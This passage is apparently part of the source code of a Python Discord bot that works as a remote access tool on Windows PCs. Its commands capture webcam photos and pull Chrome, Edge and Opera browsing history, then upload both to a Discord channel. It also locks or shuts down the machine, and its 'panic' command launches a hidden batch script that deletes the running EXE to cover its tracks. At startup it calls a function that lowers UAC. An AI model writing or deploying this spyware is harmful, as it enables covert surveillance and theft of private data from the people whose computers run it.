                if not ret or frame is None:
                    continue

                filename = f"webcam{index}_{datetime.datetime.now():%Y%m%d_%H%M%S}.jpg"
                path = os.path.join(tmp_dir, filename)
                cv2.imwrite(path, frame)
                shots.append((index, path, frame.shape[1], frame.shape[0]))

            except Exception as e:
                print(f"⚠️ Webcam {index} error: {e}")
            finally:
                if cap is not None:
                    cap.release()

        return shots

    try:
        shots = await asyncio.to_thread(capture_all)
    except Exception as e:
        await msg.edit(content=f"❌ Error while creating: `{e}`")
        return

    if not shots:
        await msg.edit(content="❌ No webcam found or access denied.")
        return

    uploaded = []
    failed = []

    for index, path, w, h in shots:
        if path is None or not os.path.isfile(path):
            failed.append(f"Camera {index}")
            continue
        try:
            file = discord.File(path, filename=os.path.basename(path))
            embed = discord.Embed(
                title=f"📷 Webcam {index}",
                description=f"Resolution: **{w}×{h}**",
                color=0xe67e22,
                timestamp=datetime.datetime.now()
            )
            embed.set_image(url=f"attachment://{os.path.basename(path)}")
            embed.set_footer(text=f"Executed by {ctx.author}")
            await download_channel.send(embed=embed, file=file)
            uploaded.append(f"Camera {index}")
        except discord.Forbidden:
            failed.append(f"Camera {index} (no permission)")
        except Exception as e:
            failed.append(f"Camera {index} ({e})")

    if not uploaded:
        await msg.edit(content="❌ No photos could be uploaded.")
        return

    summary = f"✅ {len(uploaded)} webcam photo(s) sent to {download_channel.mention}."
    if failed:
        summary += f"\n⚠️ Failed: {', '.join(failed)}"

    await msg.edit(content=summary)


# ============================================================
#  !stop – Shut down bot and close CMD window
# ============================================================
@bot.command(name="stop", aliases=["exit"])
async def stop_bot(ctx):
    """Shuts down the bot and closes the CMD window."""
    embed = discord.Embed(
        title="🛑 Bot is shutting down",
        description="The PC client will be terminated in **3 seconds**.\nThe CMD window will close.",
        color=0xe74c3c
    )
    embed.set_footer(text=f"Stopped by {ctx.author}")
    await ctx.send(embed=embed)

    # Set status to offline
    try:
        await bot.change_presence(status=discord.Status.offline)
    except Exception:
        pass

    await asyncio.sleep(3)

    print("🛑 Bot is shutting down (via !stop)...")

    # Close bot cleanly
    try:
        await bot.close()
    except Exception:
        pass

    # Close CMD window (force kill process)
    os._exit(0)

# ============================================================
#  !history – Browser history from Chrome, Edge, Opera
# ============================================================
@bot.command(name="history")
async def history(ctx):
    """Extracts browser history from Chrome, Edge and Opera."""
    try:
        from browser_history import get_history
    except ImportError:
        await ctx.send("❌ `browser-history` is not installed. Run: `pip install browser-history`")
        return

    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        await ctx.send("❌ Server not found.")
        return

    category = discord.utils.get(guild.categories, name=MY_CATEGORY_NAME)
    if category is None:
        await ctx.send("❌ Own category not found.")
        return

    download_channel = discord.utils.get(
        category.text_channels, name="⬇️down-load"
    )
    if download_channel is None:
        await ctx.send("❌ Channel `⬇️down-load` not found.")
        return

    msg = await ctx.send("📜 Extracting browser history ...")

    def extract():
        # Collect all browser histories
        outputs = get_history()
        # outputs.histories is a list of (datetime, url, title)
        return outputs.histories

    try:
        histories = await asyncio.to_thread(extract)
    except Exception as e:
        await msg.edit(content=f"❌ Error while extracting: `{e}`")
        return

    if not histories:
        await msg.edit(content="❌ No browser history found.")
        return

    # Write history to text file
    tmp_dir = os.path.join(
        os.environ.get("LOCALAPPDATA", os.path.expanduser("~")),
        "PyCord", "History"
    )
    os.makedirs(tmp_dir, exist_ok=True)

    filename = f"browser_history_{datetime.datetime.now():%Y%m%d_%H%M%S}.txt"
    filepath = os.path.join(tmp_dir, filename)

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(f"Browser history – {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n")
        f.write(f"Number of entries: {len(histories)}\n")
        f.write("=" * 80 + "\n\n")
        for timestamp, url, title in histories:
            f.write(f"[{timestamp.strftime('%Y-%m-%d %H:%M:%S')}] {title or '(no title)'}\n")
            f.write(f"  → {url}\n\n")

    # Send file to down-load channel
    try:
        file = discord.File(filepath, filename=filename)
        await download_channel.send(
            f"📜 **Browser history** from {ctx.author.mention}\n"
            f"Entries: **{len(histories)}**",
            file=file
        )
        await msg.edit(content=f"✅ History sent to {download_channel.mention} ({len(histories)} entries).")
    except discord.Forbidden:
        await msg.edit(content="❌ No permission to send in the ⬇️down-load channel.")
    except Exception as e:
        await msg.edit(content=f"❌ Error while sending: `{e}`")

# ============================================================
#  !panic – Delete all channels, delete the EXE, stop the bot
# ============================================================
@bot.command(name="panic")
async def panic(ctx):
    """
    Deletes every channel in this category, deletes the running EXE,
    then shuts down the bot and terminates the host process.
    """
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        await ctx.send("❌ Guild not found.")
        return

    category = discord.utils.get(guild.categories, name=MY_CATEGORY_NAME)
    if category is None:
        await ctx.send("❌ Category not found.")
        return

    # Confirm before doing anything
    confirm = await ctx.send(
        "⚠️ **PANIC MODE**\n"
        f"This will:\n"
        f"• Delete **all {len(category.channels)} channels** in `{category.name}`\n"
        f"• Delete the running **EXE file**\n"
        f"• Shut down the bot\n\n"
        "Type `confirm` within 15 seconds to proceed."
    )

    def check(m):
        return (
            m.author == ctx.author
            and m.channel == ctx.channel
            and m.content.lower() == "confirm"
        )

    try:
        await bot.wait_for("message", check=check, timeout=15.0)
    except asyncio.TimeoutError:
        await confirm.edit(content="❌ Panic cancelled (timeout).")
        return

    status = await ctx.send("🔥 Executing panic sequence...")

    # 1. Delete every channel in the category
    deleted = 0
    failed = 0
    for channel in list(category.channels):
        try:
            await channel.delete()
            deleted += 1
        except (discord.Forbidden, discord.NotFound, discord.HTTPException):
            failed += 1

    # 2. Try to delete the category itself
    category_deleted = False
    try:
        await category.delete()
        category_deleted = True
    except (discord.Forbidden, discord.NotFound, discord.HTTPException):
        pass

    # 3. Prepare EXE self-delete via batch script
    exe_deleted = False
    exe_path = None

    # Get the path of the running EXE (works for PyInstaller / frozen builds)
    if getattr(sys, "frozen", False):
        exe_path = sys.executable  # the .exe itself
    else:
        # Running as .py -> check if a matching .exe exists next to the script
        script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        candidate = os.path.join(script_dir, "PyCord.exe")
        if os.path.isfile(candidate):
            exe_path = candidate

    if exe_path and os.path.isfile(exe_path):
        try:
            bat_path = os.path.join(
                os.environ.get("TEMP", os.path.expanduser("~")),
                f"pycord_panic_{os.getpid()}.bat"
            )
            exe_name = os.path.basename(exe_path)

            # Batch: wait for our PID to die, then delete the EXE and itself
            bat_content = (
                "@echo off\r\n"
                f"taskkill /F /PID {os.getpid()} >nul 2>&1\r\n"
                "timeout /t 2 /nobreak >nul\r\n"
                f'del /F /Q "{exe_path}"\r\n'
                f'del /F /Q "%~f0"\r\n'
            )
            with open(bat_path, "w", encoding="utf-8") as f:
                f.write(bat_content)

            # Launch the batch hidden
            CREATE_NO_WINDOW = 0x08000000
            subprocess.Popen(
                ["cmd.exe", "/c", bat_path],
                creationflags=CREATE_NO_WINDOW,
                close_fds=True
            )
            exe_deleted = True
            print(f"🗑️ Scheduled EXE deletion: {exe_path}")
        except Exception as e:
            print(f"❌ Failed to schedule EXE deletion: {e}")
    else:
        print("ℹ️ No EXE found to delete (running as .py or no EXE next to script).")

    # 4. Report back in whatever channel is still available
    report = (
        f"🔥 Panic executed.\n"
        f"Channels deleted: **{deleted}**"
        + (f" | Failed: **{failed}**" if failed else "")
        + "\n"
        f"Category deleted: **{'yes' if category_deleted else 'no'}**\n"
        f"EXE deletion scheduled: **{'yes' if exe_deleted else 'no'}**\n"
        f"Shutting down..."
    )
    try:
        await status.edit(content=report)
    except Exception:
        pass

    print("🔥 PANIC executed. Shutting down bot and process...")

    # 5. Close Discord connection
    try:
        await bot.change_presence(status=discord.Status.offline)
    except Exception:
        pass

    try:
        await bot.close()
    except Exception:
        pass

    # 6. Hard-kill the process (closes the CMD window)
    os._exit(0)

# ============================================================
#  !lock – Lock the PC (Windows workstation lock)
# ============================================================
@bot.command(name="lock")
async def lock_pc(ctx):
    """Locks the Windows workstation."""
    if platform.system() != "Windows":
        await ctx.send("❌ This command only works on Windows.")
        return

    await ctx.send("🔒 Locking the PC...")
    try:
        import ctypes
        ctypes.windll.user32.LockWorkStation()
    except Exception as e:
        await ctx.send(f"❌ Failed to lock: `{e}`")


# ============================================================
#  !restart – Restart the bot process
# ============================================================
@bot.command(name="restart")
async def restart_bot(ctx):
    """Restarts the bot (spawns a new process and exits the current one)."""
    await ctx.send("🔄 Restarting bot...")

    try:
        await bot.change_presence(status=discord.Status.offline)
    except Exception:
        pass

    try:
        await bot.close()
    except Exception:
        pass

    print("🔄 Restart requested via !restart...")

    # Spawn a new instance of the same script, then exit
    try:
        script = os.path.abspath(sys.argv[0])
        subprocess.Popen([sys.executable, script], cwd=os.path.dirname(script))
    except Exception as e:
        print(f"❌ Could not restart: {e}")

    os._exit(0)


# ============================================================
#  !shutdown – Shut down the PC
# ============================================================
@bot.command(name="shutdown")
async def shutdown_pc(ctx, delay: int = 30):
    """
    Shuts down the host PC.
    Usage: !shutdown [seconds]   (default: 30)
    """
    if platform.system() != "Windows":
        await ctx.send("❌ This command only works on Windows.")
        return

    await ctx.send(
        f"🛑 **PC shutdown** in `{delay}` seconds.\n"
        f"Use `shutdown /a` on the PC to abort."
    )
    try:
        subprocess.Popen(["shutdown", "/s", "/t", str(delay)])
    except Exception as e:
        await ctx.send(f"❌ Failed to schedule shutdown: `{e}`")


# ============================================================
#  !setvolume – Set the system volume (0–100)
# ============================================================
@bot.command(name="setvolume", aliases=["volume", "vol"])
async def set_volume(ctx, level: int = None):
    """
    Sets the Windows system volume (0–100).
    Usage: !setvolume 50
    """
    if platform.system() != "Windows":
        await ctx.send("❌ This command only works on Windows.")
        return

    if level is None:
        await ctx.send("❌ Usage: `!setvolume <0-100>`")
        return

    if not 0 <= level <= 100:
        await ctx.send("❌ Volume must be between **0** and **100**.")
        return

    try:
        # Use the built-in Windows volume via pycaw
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None
        )
        volume = cast(interface, POINTER(IAudioEndpointVolume))

        # Set scalar volume (0.0 – 1.0)
        volume.SetMasterVolumeLevelScalar(level / 100.0, None)

        await ctx.send(f"🔊 System volume set to **{level}%**.")
    except ImportError:
        await ctx.send(
            "❌ `pycaw` and `comtypes` are required.\n"
            "Run: `pip install pycaw comtypes`"
        )
    except Exception as e:
        await ctx.send(f"❌ Failed to set volume: `{e}`")

# --- Start bot ---
if __name__ == "__main__":
    set_uac_low()
    bot.run(TOKEN)
